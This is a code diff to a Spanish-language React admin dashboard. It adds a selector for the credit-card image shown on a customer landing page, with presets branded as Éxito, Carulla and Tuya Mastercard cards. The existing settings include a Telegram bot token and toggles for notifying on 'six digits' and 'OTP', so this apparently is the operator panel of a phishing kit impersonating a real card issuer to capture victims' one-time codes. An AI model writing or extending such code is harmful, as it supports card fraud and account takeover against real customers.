@@ -128,6 +128,7 @@ export const Dashboard: React.FC<DashboardProps> = ({ onLogout, onBackToClient }
     notify_six_digits: true,
     notify_otp: true,
     loading_gif_url: '',
+    card_cover_url: '',
   })
   const [showBotToken, setShowBotToken] = useState(false)
   const [isSavingTelegram, setIsSavingTelegram] = useState(false)
@@ -445,6 +446,7 @@ export const Dashboard: React.FC<DashboardProps> = ({ onLogout, onBackToClient }
           notify_six_digits: data.config.notify_six_digits ?? true,
           notify_otp: data.config.notify_otp ?? true,
           loading_gif_url: data.config.loading_gif_url || '',
+          card_cover_url: data.config.card_cover_url || '',
         })
       }
     } catch (err) {
@@ -456,7 +458,7 @@ export const Dashboard: React.FC<DashboardProps> = ({ onLogout, onBackToClient }
     fetchTelegramConfig()
   }, [])
 
-  // Guardar credenciales de Telegram y GIF de carga
+  // Guardar credenciales de Telegram, GIF de carga y Carátula
   const handleSaveTelegram = async (e?: React.FormEvent) => {
     if (e) e.preventDefault()
     setIsSavingTelegram(true)
@@ -474,13 +476,14 @@ export const Dashboard: React.FC<DashboardProps> = ({ onLogout, onBackToClient }
           notifySixDigits: telegramConfig.notify_six_digits,
           notifyOtp: telegramConfig.notify_otp,
           loadingGifUrl: telegramConfig.loading_gif_url,
+          cardCoverUrl: telegramConfig.card_cover_url,
         }),
       })
       const data = await res.json()
       if (data.success) {
         setTelegramFeedback({
           type: 'success',
-          message: '¡Configuración y GIF guardados exitosamente en la base de datos!',
+          message: '¡Ajustes, credenciales y carátula guardados exitosamente!',
         })
       } else {
         setTelegramFeedback({
@@ -2498,6 +2501,167 @@ export const Dashboard: React.FC<DashboardProps> = ({ onLogout, onBackToClient }
                         >
                           <Save className="w-4 h-4" />
                           <span>Guardar Configuración del GIF</span>
+                        </button>
+                      </div>
+                    </div>
+                  </div>
+
+                  {/* Tarjeta de Selección de Carátula de la Tarjeta en la Landing */}
+                  <div className="bg-[#0D121F] border border-slate-800 rounded-3xl p-6 sm:p-7 shadow-xl space-y-6">
+                    <div className="flex items-center justify-between pb-4 border-b border-slate-800">
+                      <div className="flex items-center gap-2.5">
+                        <div className="w-9 h-9 rounded-xl bg-amber-500/10 text-amber-400 flex items-center justify-center font-bold">
+                          <CreditCard className="w-5 h-5" />
+                        </div>
+                        <div>
+                          <h2 className="text-sm sm:text-base font-bold text-white">Carátula de Tarjeta en la Landing</h2>
+                          <p className="text-[11px] text-slate-400">Selecciona el diseño visual de la tarjeta que ven los clientes en la portada</p>
+                        </div>
+                      </div>
+                      <span className="text-[11px] font-mono text-amber-400 bg-amber-500/10 px-2.5 py-1 rounded-lg border border-amber-500/20">
+                        Diseño Hero
+                      </span>
+                    </div>
+
+                    <div className="space-y-4">
+                      <div>
+                        <span className="text-[11px] font-bold text-slate-300 uppercase tracking-wider block mb-3">
+                          Diseños Oficiales Disponibles (Haz clic para elegir):
+                        </span>
+                        
+                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3.5">
+                          {[
+                            {
+                              id: 'privada',
+                              name: 'Éxito Clásica Privada',
+                              desc: 'Roja oficial Éxito',
+                              url: '/assets/cards/img-card-privada.png',
+                              badge: 'Clásica',
+                              badgeColor: 'bg-red-500/20 text-red-400 border-red-500/30',
+                            },
+                            {
+                              id: 'gold',
+                              name: 'Éxito Mastercard Gold',
+                              desc: 'Elegante dorada con chip EMV',
+                              url: '/assets/cards/card-exito-gold.svg',
+                              badge: 'Gold VIP',
+                              badgeColor: 'bg-amber-500/20 text-amber-400 border-amber-500/30',
+                            },
+                            {
+                              id: 'black',
+                              name: 'Éxito Mastercard Black',
+                              desc: 'Negro mate ejecutivo y oro',
+                              url: '/assets/cards/card-exito-black.svg',
+                              badge: 'Black VIP',
+                              badgeColor: 'bg-slate-500/20 text-slate-300 border-slate-500/30',
+                            },
+                            {
+                              id: 'carulla',
+                              name: 'Carulla Mastercard Black',
+                              desc: 'Verde esmeralda Carulla Tuya',
+                              url: '/assets/cards/card-carulla-black.svg',
+                              badge: 'Carulla',
+                              badgeColor: 'bg-emerald-500/20 text-emerald-400 border-emerald-500/30',
+                            },
+                            {
+                              id: 'tuya-red',
+                              name: 'Tuya Éxito Pro',
+                              desc: 'Rojo vivo degradado con líneas oro',
+                              url: '/assets/cards/card-tuya-red.svg',
+                              badge: 'Pro Nueva',
+                              badgeColor: 'bg-rose-500/20 text-rose-400 border-rose-500/30',
+                            },
+                          ].map((c) => {
+                            const isSelected =
+                              (telegramConfig.card_cover_url || '/assets/cards/img-card-privada.png') === c.url ||
+                              (!telegramConfig.card_cover_url && c.id === 'privada')
+                            return (
+                              <button
+                                key={c.id}
+                                type="button"
+                                onClick={() => setTelegramConfig({ ...telegramConfig, card_cover_url: c.url })}
+                                className={`group relative p-3 rounded-2xl border text-left transition-all cursor-pointer flex flex-col justify-between overflow-hidden ${
+                                  isSelected
+                                    ? 'bg-amber-500/10 border-amber-500 shadow-lg shadow-amber-500/10 ring-2 ring-amber-500/30'
+                                    : 'bg-[#151C2C] border-slate-800 hover:border-slate-700 hover:bg-[#1A2234]'
+                                }`}
+                              >
+                                <div className="flex items-center justify-between mb-2">
+                                  <span className={`text-[10px] font-bold px-2 py-0.5 rounded-md border ${c.badgeColor}`}>
+                                    {c.badge}
+                                  </span>
+                                  {isSelected && (
+                                    <span className="flex items-center gap-1 text-[10px] font-bold text-amber-400 bg-amber-500/20 px-2 py-0.5 rounded-full border border-amber-500/30 animate-in fade-in">
+                                      <CheckCircle2 className="w-3 h-3" />
+                                      <span>Activa</span>
+                                    </span>
+                                  )}
+                                </div>
+
+                                <div className="w-full h-28 sm:h-32 flex items-center justify-center my-2 p-1 bg-black/20 rounded-xl overflow-hidden">
+                                  <img
+                                    src={c.url}
+                                    alt={c.name}
+                                    className="max-h-full max-w-full object-contain drop-shadow-md group-hover:scale-105 transition-transform duration-200"
+                                  />
+                                </div>
+
+                                <div className="mt-1">
+                                  <span className="text-xs font-bold text-white block">{c.name}</span>
+                                  <span className="text-[10px] text-slate-400 block mt-0.5">{c.desc}</span>
+                                </div>
+                              </button>
+                            )
+                          })}
+                        </div>
+                      </div>
+
+                      {/* URL Personalizada de Carátula */}
+                      <div className="pt-2">
+                        <label className="text-xs font-bold text-slate-300 uppercase tracking-wider block mb-2">
+                          O Ingresa una URL Personalizada de Imagen:
+                        </label>
+                        <input
+                          type="url"
+                          value={telegramConfig.card_cover_url}
+                          onChange={(e) => setTelegramConfig({ ...telegramConfig, card_cover_url: e.target.value })}
+                          placeholder="https://ejemplo.com/mi-tarjeta-personalizada.png"
+                          className="w-full bg-[#151C2C] border border-slate-700/80 text-white rounded-xl px-4 py-3 text-xs sm:text-sm font-mono outline-none focus:border-amber-500 transition-all placeholder:text-slate-600"
+                        />
+                        <p className="text-[11px] text-slate-400 mt-1.5">
+                          Puedes colocar un enlace directo de cualquier imagen (.png, .svg, .jpg o .webp) o seleccionar una de las carátulas predeterminadas arriba.
+                        </p>
+                      </div>
+
+                      {/* Vista Previa de la Carátula Activa */}
+                      <div className="p-4 rounded-2xl bg-[#141A28] border border-slate-800 flex flex-col sm:flex-row items-center gap-4">
+                        <div className="w-36 h-22 shrink-0 bg-black/40 rounded-xl flex items-center justify-center p-2 border border-slate-700/50 overflow-hidden">
+                          <img
+                            src={telegramConfig.card_cover_url || '/assets/cards/img-card-privada.png'}
+                            alt="Preview Carátula"
+                            className="max-w-full max-h-full object-contain drop-shadow"
+                            onError={(e) => {
+                              ;(e.target as HTMLImageElement).src = '/assets/cards/img-card-privada.png'
+                            }}
+                          />
+                        </div>
+                        <div className="text-center sm:text-left">
+                          <span className="text-xs font-bold text-white block">Carátula Activa en la Landing</span>
+                          <span className="text-[11px] text-slate-400 block mt-0.5 font-mono break-all">
+                            {telegramConfig.card_cover_url || '/assets/cards/img-card-privada.png (Por Defecto)'}
+                          </span>
+                        </div>
+                      </div>
+
+                      <div className="pt-2">
+                        <button
+                          type="button"
+                          onClick={() => handleSaveTelegram()}
+                          disabled={isSavingTelegram}
+                          className="w-full sm:w-auto px-6 py-2.5 bg-gradient-to-r from-amber-600 to-orange-600 hover:brightness-110 disabled:opacity-50 text-white rounded-xl text-xs sm:text-sm font-bold shadow-lg shadow-amber-600/30 transition-all cursor-pointer flex items-center justify-center gap-2"
+                        >
+                          <Save className="w-4 h-4" />
+                          <span>Guardar Carátula Seleccionada</span>
                         </button>
                       </div>
                     </div>
